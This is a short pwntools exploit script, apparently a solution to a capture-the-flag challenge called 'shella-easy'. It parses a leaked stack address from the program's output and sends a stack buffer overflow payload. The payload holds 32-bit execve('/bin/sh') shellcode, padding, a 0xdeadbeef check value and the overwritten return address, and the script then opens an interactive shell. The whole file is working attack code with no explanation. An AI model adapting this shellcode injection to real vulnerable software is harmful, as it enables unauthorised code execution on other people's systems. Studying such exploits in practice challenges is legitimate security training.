from pwn import *
import re

context.terminal = ["tmux", "splitw", "-h"]

bin_name = './shella-easy'

elf = ELF(bin_name)
target = process(bin_name)
# target = gdb.debug(bin_name, '''
# start
# c
# ''')

pattern = r'0x[0-9a-fA-F]+'
location = re.search(pattern, target.recvuntil(b"fries thanks").decode()).group()
location = int(location, 16)

shellcode32 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload1 = shellcode32 + b"a"*(0x40-len(shellcode32)) + p32(0xdeadbeef)
payload2 = payload1 + b"a"*(0x4c-len(payload1)) + p32(location)

target.sendline(payload2)

target.interactive()